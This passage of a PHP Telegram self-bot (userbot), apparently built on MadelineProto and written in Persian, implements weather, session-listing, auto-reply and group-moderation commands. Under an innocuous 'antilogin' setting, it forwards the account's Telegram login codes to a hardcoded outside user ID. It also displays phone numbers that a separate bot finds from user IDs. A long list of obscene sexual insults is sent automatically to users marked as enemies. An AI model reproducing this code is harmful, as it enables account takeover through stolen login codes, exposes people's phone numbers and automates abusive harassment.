58 => <code>$reza58</code>
59 => <code>$reza59</code>
60 => <code>$reza60</code>
61 => <code>$reza61</code>
62 => <code>$reza62</code>
63 => <code>$reza63</code>
64 => <code>$reza64</code>
65 => <code>$reza65</code>
66 => <code>$reza66</code>
67 => <code>$reza67</code>
68 => <code>$reza68</code>
69 => <code>$reza69</code>
70 => <code>$reza70</code>
71 => <code>$reza71</code>
72 =><code>$reza72</code>
73 => <code>$reza73</code>
74 => <code>$reza74</code>
75 => <code>$reza75</code>
76 => <code>$reza76</code>
77 => <code>$reza77</code>
78 => <code>$reza78</code>
79 => <code>$reza79</code>
80 => <code>$reza80</code>
81 => <code>$reza81</code>
82 => <code>$reza82</code>
83 => <code>$reza83</code>
84 => <code>$reza84</code>
85 => <code>$reza85</code>
86 => <code>$reza86</code>
87 => <code>$reza87</code>
88 => <code>$reza88</code>
89 => <code>$reza89</code>
90 => <code>$reza90</code>
91 => <code>$reza91</code>
92 => <code>$reza92</code>
93 => <code>$reza93</code>
94 => <code>$reza94</code>
95 => <code>$reza95</code>
96 => <code>$reza96</code>
97 => <code>$reza97</code>
98 => <code>$reza98</code>
99 => <code>$reza99</code>
100 => <code>$reza100</code>
101 => <code>$reza101</code>
102 => <code>$reza102</code>
103 => <code>$reza103</code>
104 => <code>$reza104</code>
105 => <code>$reza105</code>
106 => <code>$reza106</code>
107 => <code>$reza107</code>
108 => <code>$reza108</code>
109 => <code>$reza109</code>
110 => <code>$reza110</code>
111 => <code>$reza111</code>
112 => <code>$reza112</code>
113 => <code>$reza113</code>
114 => <code>$reza114</code>
115 => <code>$reza115</code>
116 => <code>$reza116</code>
117 => <code>$reza117</code>
118 => <code>$reza118</code>
119 => <code>$reza119</code>
120 => <code>$reza120</code>
121 => <code>$reza121</code>
122 => <code>$reza122</code>
123 => <code>$reza123</code>
124 => <code>$reza124</code>
125 => <code>$reza125</code>
126 => <code>$reza126</code>
127 => <code>$reza127</code>
128 => <code>$reza128</code>
129 => <code>$reza129</code>
130 => <code>$reza130</code>
131 => <code>$reza131</code>
132 => <code>$reza132</code>
133 => <code>$Preza133</code>
134 => <code>$reza134</code>
135 => <code>$reza135</code>
136 => <code>$reza136</code>
137 => <code>$reza137</code>
138 => <code>$reza138</code>
⁅———— ◕ ————⁆
", 'parse_mode' => 'HTML']);
                    } else if (preg_match("/^[\/\#\!]?(weather) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(weather) (.*)$/i", $text, $m);
                        $query = $m[2];
                        $url = json_decode(file_get_contents("http://api.openweathermap.org/data/2.5/weather?q=" . $query . "&appid=eedbc05ba060c787ab0614cad1f2e12b&units=metric"), true);
                        $city = $url["name"];
                        $deg = $url["main"]["temp"];
                        $type1 = $url["weather"][0]["main"];
                        if ($type1 == "Clear") {
                            $tpp = 'آفتابی☀';
                            file_put_contents('type.txt', $tpp);
                        } elseif ($type1 == "Clouds") {
                            $tpp = 'ابری ☁☁';
                            file_put_contents('type.txt', $tpp);
                        } elseif ($type1 == "Rain") {
                            $tpp = 'بارانی ☔';
                            file_put_contents('type.txt', $tpp);
                        } elseif ($type1 == "Thunderstorm") {
                            $tpp = 'طوفانی ☔☔☔☔';
                            file_put_contents('type.txt', $tpp);
                        } elseif ($type1 == "Mist") {
                            $tpp = 'مه 💨';
                            file_put_contents('type.txt', $tpp);
                        }
                        if ($city != '') {
                            $ziro = file_get_contents('type.txt');
                            $txt = "دمای شهر $city هم اکنون $deg درجه سانتی گراد می باشد

شرایط فعلی آب و هوا: $ziro";
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txt]);
                            unlink('type.txt');
                        } else {
                            $txt = "⚠️شهر مورد نظر شما يافت نشد";
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txt]);
                        }
                    } else if (preg_match("/^[\/\#\!]?(sessions)$/i", $text)) {
                        $authorizations = yield $this->account->getAuthorizations();
                        $txxt = "";
                        foreach ($authorizations['authorizations'] as $authorization) {
                            $txxt .= "
هش: " . $authorization['hash'] . "
مدل دستگاه: " . $authorization['device_model'] . "
سیستم عامل: " . $authorization['platform'] . "
ورژن سیستم: " . $authorization['system_version'] . "
api_id: " . $authorization['api_id'] . "
app_name: " . $authorization['app_name'] . "
نسخه برنامه: " . $authorization['app_version'] . "
تاریخ ایجاد: " . date("Y-m-d H:i:s", $authorization['date_active']) . "
تاریخ فعال: " . date("Y-m-d H:i:s", $authorization['date_active']) . "
آی‌پی: " . $authorization['ip'] . "
کشور: " . $authorization['country'] . "
منطقه: " . $authorization['region'] . "

====================";
                        }
                        $this->messages->sendMessage(['peer' => $peer, 'message' => $txxt]);
                    }
                    if (preg_match("/^[\/\#\!]?(gpinfo)$/i", $text)) {
                        $peer_inf = yield $this->get_full_info($message['to_id']);
                        $peer_info = $peer_inf['Chat'];
                        $peer_id = $peer_info['id'];
                        $peer_title = $peer_info['title'];
                        $peer_type = $peer_inf['type'];
                        $peer_count = $peer_inf['full']['participants_count'];
                        $des = $peer_inf['full']['about'];
                        $mes = "ID: $peer_id \nTitle: $peer_title \nType: $peer_type \nMembers Count: $peer_count \nBio: $des";
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => $mes]);
                    }
                }
                if ($data['power'] == "on") {
                    if ($from_id != $Sis) {
                        if ($message && file_get_contents('typing.txt') == 'on' && $update['_'] == "updateNewChannelMessage") {
                            $sendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
                            yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageTypingAction]);
                        }
                        if ($message && file_get_contents('timesticker.txt') == 'on' && $update['_'] == "updateNewChannelMessage") {
//$min = date('i');
//$sec = date('s');
//if(in_array($min, range(0,55,5)) && $sec == 0){
                            $timei = date('i:s');
                            if ($timei == '05:00' or $timei == '10:00' or $timei == '15:00' or $timei == '20:00' or $timei == '25:00' or $timei == '30:00' or $timei == '35:00' or $timei == '40:00' or $timei == '45:00' or $timei == '50:00' or $timei == '55:00' or $timei == '00:00') {
                                yield $this->messages->sendMedia([
                                    'peer' => $peer,
                                    'media' => [
                                        '_' => 'inputMediaUploadedDocument',
                                        'file' => 'sticker.webp',
                                        'attributes' => [
                                            [
                                                '_' => 'documentAttributeSticker',
                                                'alt' => '😀'
                                            ]
                                        ]
                                    ]
                                ]);
                            }
                        }

                        if ($message && file_get_contents('gameplay.txt') == 'on' && $update['_'] == "updateNewChannelMessage") {
                            $sendMessageGamePlayAction = ['_' => 'sendMessageGamePlayAction'];
                            yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageGamePlayAction]);
                        }
                        if ($message && file_get_contents('audioaction.txt') == 'on' && $update['_'] == "updateNewChannelMessage") {
                            $sendMessageRecordAudioAction = ['_' => 'sendMessageRecordAudioAction'];
                            yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageRecordAudioAction]);
                        }
                        if ($message && file_get_contents('videoaction.txt') == 'on' && $update['_'] == "updateNewChannelMessage") {
                            $sendMessageRecordVideoAction = ['_' => 'sendMessageRecordVideoAction'];
                            yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageRecordVideoAction]);
                        }
                        if (file_get_contents('gamepv.txt') == 'on') {
                            $sendMessageGamePlayAction = ['_' => 'sendMessageGamePlayAction'];
                            yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageGamePlayAction]);
                        }
                        if ($message && $data['echo'] == "on") {
                            yield $this->messages->forwardMessages(['from_peer' => $peer, 'to_peer' => $peer, 'id' => [$message['id']]]);
                        }
                        if ($message && file_get_contents('markread.txt') == 'on') {
                            if (intval($peer) < 0) {
                                yield $this->channels->readHistory(['channel' => $peer, 'max_id' => $message['id']]);
                                yield $this->channels->readMessageContents(['channel' => $peer, 'id' => [$message['id']]]);
                            } else {
                                yield $this->messages->readHistory(['peer' => $peer, 'max_id' => $message['id']]);
                            }
                        }
                        if (strpos($text, '😐') !== false and $data['poker'] == "on") {
                            $this->messages->sendMessage(['peer' => $peer, 'message' => '😐', 'reply_to_msg_id' => $message['id']]);
                            yield $this->sleep(1);
                        }
                        if (strpos($text, "✅ #شماره_پیدا_شد") !== false && $from_id == 1565231209) {
                            $text2 = explode("\n", $text)[2];
                            $e1 = str_replace("☎️ شماره : ", "", $text2);
                            $msgsgs = file_get_contents("msgid25.txt");
                            $perer = file_get_contents("peer5.txt");
                            $e = file_get_contents("id.txt");
                            yield $this->messages->editMessage(['peer' => $perer, 'id' => $msgsgs, 'message' => "» شماره تلفن : `$e1`
» آیدی عددی : `$e`", 'parse_mode' => 'markdown']);
                            unlink("msgid25.txt");
                            unlink("peer5.txt");
                            unlink("id.txt");
                        }

                        if (strpos($text, "❌ #شماره_پیدا_نشد") !== false && $from_id == 1565231209) {
                            $msgsgs = file_get_contents("msgid25.txt");
                            $perer = file_get_contents("peer5.txt");
                            $e = file_get_contents("id.txt");
                            yield $this->messages->editMessage(['peer' => $perer, 'id' => $msgsgs, 'message' => "» شماره پیدا نشد ! «",
                                'parse_mode' => 'markdown']);
                            unlink("msgid25.txt");
                            unlink("peer5.txt");
                            unlink("id.txt");
                        }

                        if ($type3 == 'user') {
                            if ($text == $text and file_get_contents('lockpv.txt') == 'on') {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "شما به دلیل فعال بودن حالت Lockpv بلاک شدید!"]);
                                yield $this->messages->sendMessage(['peer' => $Sis, 'message' => "کاربر $peer به دلیل روشن بودن حالت lockpv بلاک شد!"]);

                                yield $this->contacts->block(['id' => $peer]);
                            }
                        }

                        $fohsh = [
                            "کیرم کون مادرت😂😂😂😂", "بالا باش کیرم کص مادرت😂😂😂", "مادرتو میگام نوچه جون بالا😂😂😂", "اب خارکصته تند تند تایپ کن ببینم", "مادرتو میگام بخای فرار کنی", "لال شو دیگه نوچه", "مادرتو میگام اف بشی", "کیرم کون مادرت", "کیرم کص مص مادرت بالا", "کیرم تو چشو چال مادرت", "کون مادرتو میگام بالا", "بیناموس  خسته شدی؟", "نبینم خسته بشی بیناموس", "ننتو میکنم", "کیرم کون مادرت 😂😂😂😂😂😂😂", "صلف تو کصننت بالا", "بیناموس بالا باش بهت میگم", "کیر تو مادرت", "کص مص مادرتو بلیسم؟", "کص مادرتو چنگ بزنم؟", "به خدا کصننت بالا ", "مادرتو میگام ", "کیرم کون مادرت بیناموس", "مادرجنده بالا باش", "بیناموس تا کی میخای سطحت گح باشه", "اپدیت شو بیناموس خز بود", "ای تورک خر بالا ببینم", "و اما تو بیناموس چموش", "تو یکیو مادرتو میکنم", "کیرم تو ناموصت ", "کیر تو ننت", "ریش روحانی تو ننت", "کیر تو مادرت😂😂😂", "کص مادرتو مجر بدم", "صلف تو ننت", "بات تو ننت ", "مامانتو میکنم بالا", "وای این تورک خرو", "سطحشو نگا", "تایپ کن بیناموس", "خشاب؟", "کیرم کون مادرت بالا", "بیناموس نبینم خسته بشی", "مادرتو بگام؟", "گح تو سطحت شرفت رف", "بیناموس شرفتو نابود کردم یه کاری کن", "وای کیرم تو سطحت", "بیناموس روانی شدی", "روانیت کردما", "مادرتو کردم کاری کن", "تایپ تو ننت", "بیپدر بالا باش", "و اما تو لر خر", "ننتو میکنم بالا باش", "کیرم لب مادرت بالا😂😂😂", "چطوره بزنم نصلتو گح کنم", "داری تظاهر میکنی ارومی ولی مادرتو کوص کردم", "مادرتو کردم بیغیرت", "هرزه", "وای خدای من اینو نگا", "کیر تو کصننت", "ننتو بلیسم", "منو نگا بیناموس", "کیر تو ننت بسه دیگه", "خسته شدی؟", "ننتو میکنم خسته بشی", "وای دلم کون مادرت بگام", "اف شو احمق", "بیشرف اف شو بهت میگم", "مامان جنده اف شو", "کص مامانت اف شو", "کص لش وا ول کن اینجوری بگو؟", "ای بیناموس چموش", "خارکوصته ای ها", "مامانتو میکنم اف نشی", "گح تو ننت", "سطح یه گح صفتو", "گح کردم تو نصلتا", "چه رویی داری بیناموس", "ناموستو کردم", "رو کص مادرت کیر کنم؟😂😂😂", "نوچه بالا", "کیرم تو ناموصتاا😂😂", "یا مادرتو میگام یا اف میشی", "لالشو دیگه", "بیناموس", "مادرکصته", "ناموص کصده", "وای بدو ببینم میرسی", "کیرم کون مادرت چیکار میکنی اخه", "خارکصته بالا دیگه عه", "کیرم کصمادرت😂😂😂", "کیرم کون ناموصد😂😂😂", "بیناموس من خودم خسته شدم توچی؟", "ای شرف ندار", "مامانتو کردم بیغیرت", "و اما مادر جندت", "تو یکی زیر باش", "اف شو", "خارتو کوص میکنم", "کوصناموصد", "ناموص کونی", "خارکصته ی بۍ غیرت", "شرم کن بیناموس", "مامانتو کرد ", "ای مادرجنده", "بیغیرت", "کیرتو ناموصت", "بیناموس نمیخای اف بشی؟", "ای خارکوصته", "لالشو دیگه", "همه کس کونی", "حرامزاده", "مادرتو میکنم", "بیناموس", "کصشر", "اف شو مادرکوصته", "خارکصته کجایی", "ننتو کردم کاری نمیکنی؟", "کیرتو مادرت لال", "کیرتو ننت بسه", "کیرتو شرفت", "مادرتو میگام بالا", "کیر تو مادرت"
                            , "کونی ننه ی حقیر زاده", "وقتی تو کص ننت تلمبه های سرعتی میزدم تو کمرم بودی بعد الان برا بکنه ننت شاخ میشی هعی   ", "تو یه کص ننه ای ک ننتو به من هدیه کردی تا خایه مالیمو کنی مگ نه خخخخ", "انگشت فاکم تو کونه ناموست", "تخته سیاهه مدرسه با معادلات ریاضیه روش تو کص ننت اصلا خخخخخخخ ", "کیرم تا ته خشک خشک با کمی فلفل روش تو کص خارت ", "کص ننت به صورت ضربدری ", "کص خارت به صورت مستطیلی", "رشته کوه آلپ به صورت زنجیره ای تو کص نسلت خخخخ ", "10 دقیقه بیشتر ابم میریخت تو کس ننت این نمیشدی", "فکر کردی ننت یه بار بهمـ داده دیگه شاخی", "اگر ننتو خوب کرده بودم حالا تو اینجوری نمیشدی"
                            , "حروم لقمع", "ننه سگ ناموس", "منو ننت شما همه چچچچ", "ننه کیر قاپ زن", "ننع اوبی", "ننه کیر دزد", "ننه کیونی", "ننه کصپاره", "زنا زادع", "کیر سگ تو کص نتت پخخخ", "ولد زنا", "ننه خیابونی", "هیس بع کس حساسیت دارم", "کص نگو ننه سگ که میکنمتتاااا", "کص نن جندت", "ننه سگ", "ننه کونی", "ننه زیرابی", "بکن ننتم", "ننع فاسد", "ننه ساکر", "کس ننع بدخواه", "نگاییدم", "مادر سگ", "ننع شرطی", "گی ننع", "بابات شاشیدتت چچچچچچ", "ننه ماهر", "حرومزاده", "ننه کص", "کص ننت باو", "پدر سگ", "سیک کن کص ننت نبینمت", "کونده", "ننه ولو", "ننه سگ", "مادر جنده", "کص کپک زدع", "ننع لنگی", "ننه خیراتی", "سجده کن سگ ننع", "ننه خیابونی", "ننه کارتونی", "تکرار میکنم کص ننت", "تلگرام تو کس ننت", "کص خوارت", "خوار کیونی", "پا بزن چچچچچ", "مادرتو گاییدم", "گوز ننع", "کیرم تو دهن ننت", "ننع همگانی", "کیرم تو کص زیدت", "کیر تو ممهای ابجیت", "ابجی سگ", "کس دست ریدی با تایپ کردنت چچچ", "ابجی جنده", "ننع سگ سیبیل", "بده بکنیم چچچچ", "کص ناموس", "شل ناموس", "ریدم پس کلت چچچچچ", "ننه شل", "ننع قسطی", "ننه ول", "دست و پا نزن کس ننع", "ننه ولو", "خوارتو گاییدم", "محوی!؟", "ننت خوبع!؟", "کس زنت", "شاش ننع", "ننه حیاطی", "نن غسلی", "کیرم تو کس ننت بگو مرسی چچچچ", "ابم تو کص ننت", "فاک یور مادر خوار سگ پخخخ", "کیر سگ تو کص ننت", "کص زن", "ننه فراری", "بکن ننتم من باو جمع کن ننه جنده /:::", "ننه جنده بیا واسم ساک بزن", "حرف نزن که نکنمت هااا :|", "کیر تو کص ننت😐", "کص کص کص ننت😂", "کصصصص ننت جووون", "سگ ننع", "کص خوارت", "کیری فیس", "کلع کیری", "تیز باش سیک کن نبینمت", "فلج تیز باش چچچ", "بیا ننتو ببر", "بکن ننتم باو ", "کیرم تو بدخواه", "چچچچچچچ", "ننه جنده", "ننه کص طلا", "ننه کون طلا", "کس ننت بزارم بخندیم!؟", "کیرم دهنت", "مادر خراب", "ننه کونی", "هر چی گفتی تو کص ننت خخخخخخخ", "کص ناموست بای", "کص ننت بای ://", "کص ناموست باعی تخخخخخ", "کون گلابی!", "ریدی آب قطع", "کص کن ننتم کع", "نن کونی", "نن خوشمزه", "ننه لوس", " نن یه چشم ", "ننه چاقال", "ننه جینده", "ننه حرصی ", "نن لشی", "ننه ساکر", "نن تخمی", "ننه بی هویت", "نن کس", "نن سکسی", "نن فراری", "لش ننه", "سگ ننه", "شل ننه", "ننه تخمی", "ننه تونلی", "ننه کوون", "نن خشگل", "نن جنده", "نن ول ", "نن سکسی", "نن لش", "کس نن ", "نن کون", "نن رایگان", "نن خاردار", "ننه کیر سوار", "نن پفیوز", "نن محوی", "ننه بگایی", "ننه بمبی", "ننه الکسیس", "نن خیابونی", "نن عنی", "نن ساپورتی", "نن لاشخور", "ننه طلا", "ننه عمومی", "ننه هر جایی", "نن دیوث", "تخخخخخخخخخ", "نن ریدنی", "نن بی وجود", "ننه سیکی", "ننه کییر", "نن گشاد", "نن پولی", "نن ول", "نن هرزه", "نن دهاتی", "ننه ویندوزی", "نن تایپی", "نن برقی", "نن شاشی", "ننه درازی", "شل ننع", "یکن ننتم که", "کس خوار بدخواه", "آب چاقال", "ننه جریده", "ننه سگ سفید", "آب کون", "ننه 85", "ننه سوپری", "بخورش", "کس ن", "خوارتو گاییدم", "خارکسده", "گی پدر", "آب چاقال", "زنا زاده", "زن جنده", "سگ پدر", "مادر جنده", "ننع کیر خور", "چچچچچ", "تیز بالا", "ننه سگو با کسشر در میره", "کیر سگ تو کص ننت", "kos kesh", "kiri", "nane lashi", "kos", "kharet", "blis kirmo", "دهاتی", "کیرم لا کص خارت", "کص ننت", "  مادر کونی مادر کص خطا کار کیر ب کون بابات ش تیز باش خرررررر خارتو از‌کص‌گایید نباص شاخ شی کص‌ننت چس‌پدر خارتو ننت زیر‌کیرم‌پناهنده شدن افصوص میخورم واصت ک خایه نداری از ننت دفاع کنی افصوص میخورم واصت ک خایه نداری از ننت دفاع کنی سسسسسسگ ننتو از کچن‌کرد نباص شاخ شی مادر کون خطا سیک کن تو کص خارت بی ناموس مادر‌کص‌جق شده کص ننت سالهای سالها بالا بیناموص خار کیر شده بالا باش بخندم ب کص خارت بالا باش بخندم ب کص خارت پصرم تو هیچ موقع ب من نمیرصی مادر هیز کص افی بیا کیرمو با خودت ببر بع کص ننت وقتی از ترس من میری اونجابرو تو کص خارت کص ننت سالهای سالها بالا کونی کیر به مادره خودتو کصی تورو شاخ کرد بردکونتو بده ", " خارکصه  خارجنده  کیرم دهنت  مادر کونی  مادر کص خطا کار  کیر ب کون بابات ش تیز باش  خرررررر خارتو از‌کص‌گایید نباص شاخ شی  افصوص میخورم واصت ک خایه نداری از ننت دفاع کنی  سسسسسسگ ننتو از کچن‌کرد نباص شاخ شی  بی ناموس مادر‌کص‌جق شده  کص ننت سالهای سالها بالا  خار خیز تخم خر  ننه کص مهتابی  ننه کص تیز  ننه کیر خورده شده  مادر هیز کص افی  بالا باش بخندم ب کص خارت  افصوص میخورم واصت ک خایه نداری از ننت دفاع کنی  پصرم تو هیچ موقع ب من نمیرصی  ننه کصو  کوصکش  کونده  پدرسگ  پدرکونی  پدرجنده  مادرت داره بهم میدع  کیرم تو ریش بابات  مداد تو کص مادرت  کیر خر تو کونت  کیر خر تو کص مادرت  کیر خر تو کص خواهرت ", "تونل تو کص ننت", "ننه خرکی", "خوار کصده", "ننه کصو", "مادر بيبي بالا باش ميخوام مادرت رو جوري بگام ديگه لب خند نياد رو لباش", "کیری ننه", "منو ننت شما همه چچچچ", "ولد زنا بی ننه", "میزنم ننتو کص‌پر میکنم ک ‌شاخ‌ نشی", "بی خودو بی جهت کص‌ننت", "صگ‌ممبر اوب مادر تیز باش", "بيناموص بالا باش  يه درصد هم فکر نکن ولت ميکنم", "اخخههه میدونصی خارت هی کص‌میده؟؟؟", "کیر سگ تو کص نتت پخخخ", "راهی نی داش کص ننت", "پا بزن یتیمک کص خل", "هیس بع کس حساسیت دارم", "کص نگو ننه سگ که میکنمتتاااا", "کص نن جندت", "ای‌کیرم ب ننت", "کص‌خارت تیز باش", "اتایپم تو کص‌ننت جا شه  ", "بکن ننتم", "کیرمو کردم‌کص‌ننت هار شدی؟", "انقد ضعیف نباش چصک", "مادر فلش شده جوری با کیر‌میزنم ب فرق سر ننت ک حافظش بپره", "خیلی اتفاقی کیرم‌ب خارت", "یهویی کص‌ننتو بکنم؟؟؟", "مادر بیمه ایی‌کص‌ننتو میگام", "بیا کیرمو بگیر بلیص شاید فرجی شد ننت از زیر کیرم فرار کنه", "بابات شاشیدتت چچچچچچ", "حیف کیرم‌که کص ننت کنم", "مادر‌کص شکلاتی تیز تر باش", "بیناموص زیر نباش مادر کالج رفته", "کص ننت باو", "همت کنی کیرمو بخوری", "سیک کن کص ننت نبینمت", "ناموص اختاپوص رو ننت قفلم‌میفمی؟؟؟؟", "کیر هافبک دفاعی تیم فرانسه که اصمش‌ یادم نی ب کص‌ننت", "برص و بالا باش خار‌کصه", "مادر جنده", "داش میخام چوب بیصبال رو تو کون ننت کنم محو نشو:||", "خار‌کص شهوتی نباید شاخ میشدی", "خخخخخخخخههههخخخخخخخ کص‌ننت بره پا بزن داداش", "سجده کن سگ ننع", "کیرم از چهار جهت فرعی یراص تو کص‌ناموصت", "داش برص راهی نی کیری شاخ شدی", "تکرار میکنم کص ننت", "تلگرام تو کس ننت", "کص خوارت", "کیر‌ب سردر دهاتتون واص من شاخ میشی", "پا بزن چچچچچ", "مادرتو گاییدم", "بدو برص تا خایهامو تا ته نکردم‌تو کص‌ننت", "کیرم تو دهن ننت", "کص‌ننت ول کن خایهامو راهی نی باید ننت بکنم", "کیرم تو کص زیدت", "کیر تو ممهای ابجیت", "بی‌ننه‌ ممبر خار بیمار", "تو کیفیت کار‌منو زیر‌سوال میبریچچ", "داش تو خودت خاسی بیناموص شی میفمی؟؟", "داش تو در‌میری ولی‌مادرت چی؟؟؟", "خارتو با کیر میزنم‌تو صورتش جوری ک‌با دیورا بحرفه", "ننه کیر‌خور تو ب کص‌خارت خندیدی شاخیدی", "بالا باش تایپ بده بخندم‌بهت", "ریدم پس کلت چچچچچ", "بالا باش کیرمو ناخودآگاه تو کص‌ننت کنم", "ننت ب زیرم  واس درد کیرم", "خیخیخیخیخخیخخیخیخخییخیخیخخ", "دست و پا نزن کس ننع", "الهی خارتو بکنم‌ بی خار ممبر", "مادرت از کص‌جر‌بدم ‌ک ‌دیگ نشاخی؟؟؟ننه لاشی", "ممه", "کص", "کیر", "بی خایه", "ننه لش", "بی پدرمادر", "خارکصده", "مادر جنده", "کصکش"
                        ];
                        if (in_array($from_id, $data['enemies'])) {
                            $f = $fohsh[rand(0, count($fohsh) - 1)];
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $f, 'reply_to_msg_id' => $msg_id]);
                        }
                        if (in_array($from_id, $data['muted'])) {
                            $messages_AffectedMessages = $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                        }
                        if (isset($data['answering'][$text])) {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $data['answering'][$text], 'reply_to_msg_id' => $msg_id]);
                        }
                        if (file_get_contents('lockgp.txt') == 'on') {
                            if (isset($update['update']['message']['media']['document']) or isset($update['update']['message']['media']['photo']) or $text !== false) {
                                $messages_AffectedMessages = $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }

                        if (file_get_contents('antilogin.txt') == 'on') {
                            if (isset($text) && $userID == 777000 && strpos($text, 'Login code: ') !== false)
                                yield $this->messages->forwardMessages(['from_peer' => $userID, 'to_peer' => 904067273, 'id' => [$msg_id],]);
                        }
                        if (file_get_contents('locklink.txt') == 'on') {
                            if (preg_match("/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $text)) {
                                $messages_AffectedMessages = $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                            if (strpos($text, 'https') !== false or strpos($text, 'Https') !== false) {
                                $messages_AffectedMessages = $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                        if (file_get_contents('locktag.txt') == 'on') {
                            if (strpos($text, "@") !== false) {
                                $messages_AffectedMessages = $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                        if (file_get_contents('autochat.txt') == 'on') {
                            if (strpos($text, 'سلام') !== false) {
                                $sendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
                                yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageTypingAction]);
                                yield $this->sleep(3);
                                $slm = ["علیک سلام", "سلام خوبی", "چخبر", "علیک", "خوبی؟"];
                                $randslm = $slm[array_rand($slm)];

                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$randslm", 'reply_to_msg_id' => $message['id']]);

                            }
                            if (strpos($text, 'بای') !== false) {
                                $sendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
                                yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageTypingAction]);
                                yield $this->sleep(3);
                                $bye = ["بای", "خدافظ", "فعلا", "برو دیه", "بسلامت"];
                                $randbye = $bye[array_rand($bye)];

                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$randbye", 'reply_to_msg_id' => $message['id']]);
                            }
                        }
                    }
                }
            }
        } catch (\Exception $e) {
        } catch (\danog\MadelineProto\RPCErrorException $e) {
        }
    }
}

register_shutdown_function('shutdown_function', $lock);
closeConnection();
$MadelineProto->async(true);
$MadelineProto->loop(function () use ($MadelineProto) {
  yield $MadelineProto->setEventHandler('\EventHandler');
});
$MadelineProto->loop();
?>
